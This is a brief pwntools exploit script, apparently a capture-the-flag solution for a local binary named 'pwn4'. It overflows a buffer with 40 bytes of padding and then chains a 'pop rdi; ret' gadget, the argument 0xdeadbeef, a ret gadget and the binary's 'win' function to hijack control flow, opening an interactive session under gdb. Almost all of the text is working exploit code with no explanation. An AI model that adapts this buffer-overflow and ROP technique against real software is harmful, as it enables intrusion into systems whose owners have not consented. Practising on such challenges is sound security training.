from pwn import *


binary = "./pwn4"
e = ELF(binary)

r = process(binary)

pop_rdi_ret = 0x0000000000401253


payload = flat("A" *32, "B" *8, p64(pop_rdi_ret), p64(0xdeadbeef),p64(0x00000000004011c9),p64(e.symbols['win']))
gdb.attach(r)
r.recv()
r.sendline(payload)
r.interactive()

